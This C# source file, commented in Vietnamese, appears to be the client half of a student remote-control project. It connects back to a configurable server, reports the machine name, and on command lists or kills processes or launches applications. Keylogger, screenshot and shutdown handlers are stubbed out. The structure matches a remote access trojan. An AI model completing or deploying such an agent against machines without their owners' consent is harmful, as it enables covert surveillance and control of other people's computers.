using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
// Import thư mục Features để sử dụng ProcessManager
using ClientAgent.Features;

namespace ClientAgent.Core
{
    public static class ClientSocket
    {
        private static Socket _clientSocket;
        // Buffer lớn (5MB) để nhận dữ liệu thoải mái
        private static readonly byte[] _buffer = new byte[1024 * 5000];

        // --- CẤU HÌNH SERVER ---
        // Bạn nhớ đổi IP này thành IP máy tính đóng vai trò Server của bạn
        private const string SERVER_IP = "255.255.255.0";
        private const int SERVER_PORT = 9999;

        private static bool _isConnected = false;

        /// <summary>
        /// Hàm khởi tạo, gọi 1 lần duy nhất tại Program.cs
        /// </summary>
        public static void Initialize()
        {
            Thread connectThread = new Thread(ConnectLoop);
            connectThread.IsBackground = true; // Tự tắt khi ứng dụng tắt
            connectThread.Start();
        }

        // Vòng lặp kết nối liên tục (Auto Reconnect)
        private static void ConnectLoop()
        {
            while (true)
            {
                try
                {
                    if (!_isConnected || _clientSocket == null || !_clientSocket.Connected)
                    {
                        // Tạo socket TCP
                        _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                        // Thử kết nối
                        _clientSocket.Connect(IPAddress.Parse(SERVER_IP), SERVER_PORT);
                        _isConnected = true;

                        // Gửi tin nhắn chào hỏi để Server biết máy này là ai
                        // Ví dụ: INFO|PC_NAME|Connected
                        SendString($"INFO|{Environment.MachineName}|Connected");

                        // Bắt đầu lắng nghe dữ liệu từ Server
                        _clientSocket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), null);
                    }
                }
                catch
                {
                    // Nếu lỗi (server chưa mở, rớt mạng), đợi 3 giây rồi thử lại
                    _isConnected = false;
                }
                Thread.Sleep(3000);
            }
        }

        // Hàm xử lý khi nhận được dữ liệu
        private static void ReceiveCallback(IAsyncResult ar)
        {
            try
            {
                int received = _clientSocket.EndReceive(ar);
                if (received == 0)
                {
                    _isConnected = false;
                    return;
                }

                byte[] data = new byte[received];
                Array.Copy(_buffer, data, received);

                // Chuyển dữ liệu nhận được thành chuỗi lệnh
                string commandStr = Encoding.UTF8.GetString(data);

                // Chuyển lệnh đi xử lý
                HandleCommand(commandStr);

                // Tiếp tục lắng nghe lệnh tiếp theo
                _clientSocket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), null);
            }
            catch
            {
                _isConnected = false;
            }
        }

        // --- TRUNG TÂM XỬ LÝ LỆNH (QUAN TRỌNG NHẤT) ---
        private static void HandleCommand(string cmd)
        {
            // Cắt chuỗi lệnh. Ví dụ lệnh: "PROC_KILL|1234" -> parts[0]="PROC_KILL", parts[1]="1234"
            string[] parts = cmd.Split('|');
            string mainCmd = parts[0].ToUpper();

            try
            {
                switch (mainCmd)
                {
                    // ==========================================
                    // 1. CHỨC NĂNG QUẢN LÝ APP / PROCESS (ĐÃ XONG)
                    // ==========================================
                    case "PROC_LIST":
                        // Server yêu cầu lấy danh sách tiến trình
                        string procList = ProcessManager.GetProcesses();
                        SendString("PROC_LIST_RESULT|" + procList);
                        break;

                    case "PROC_KILL":
                        // Server yêu cầu Kill PID. VD: PROC_KILL|5678
                        if (parts.Length > 1 && int.TryParse(parts[1], out int pidToKill))
                        {
                            string killResult = ProcessManager.KillProcess(pidToKill);
                            SendString("PROC_LOG|" + killResult);
                        }
                        break;

                    case "APP_START":
                        // Server yêu cầu mở app. VD: APP_START|notepad
                        if (parts.Length > 1)
                        {
                            string startResult = ProcessManager.StartProcess(parts[1]);
                            SendString("PROC_LOG|" + startResult);
                        }
                        break;

                    // ==========================================
                    // 2. CHỤP MÀN HÌNH (SẮP LÀM)
                    // ==========================================
                    case "SCREENSHOT":
                        // TODO: Gọi hàm ScreenCapture.TakeScreenshot() ở đây
                        break;

                    // ==========================================
                    // 3. KEYLOGGER (SẮP LÀM)
                    // ==========================================
                    case "KEYLOG_ON":
                        // TODO: Bật hook
                        break;
                    case "KEYLOG_OFF":
                        // TODO: Tắt hook
                        break;
                    case "KEYLOG_GET":
                        // TODO: Gửi chuỗi log về
                        break;

                    // ==========================================
                    // 4. POWER (SHUTDOWN/RESTART)
                    // ==========================================
                    case "POWER_SHUTDOWN":
                        // System.Diagnostics.Process.Start("shutdown", "/s /t 0");
                        break;
                    case "POWER_RESTART":
                        // System.Diagnostics.Process.Start("shutdown", "/r /t 0");
                        break;
                }
            }
            catch (Exception ex)
            {
                SendString("ERROR|Lỗi xử lý lệnh: " + ex.Message);
            }
        }

        // --- CÁC HÀM GỬI DỮ LIỆU VỀ SERVER ---

        public static void SendString(string text)
        {
            if (!_isConnected) return;
            try
            {
                byte[] buffer = Encoding.UTF8.GetBytes(text);
                _clientSocket.Send(buffer);
            }
            catch { _isConnected = false; }
        }

        // Hàm này dùng để gửi ảnh (byte array) sau này
        public static void SendData(byte[] data)
        {
            if (!_isConnected) return;
            try
            {
                // Đối với dữ liệu lớn (ảnh), thường ta gửi kích thước trước
                // Nhưng để đơn giản lúc đầu, ta cứ gửi thẳng data
                _clientSocket.Send(data);
            }
            catch { _isConnected = false; }
        }
    }
}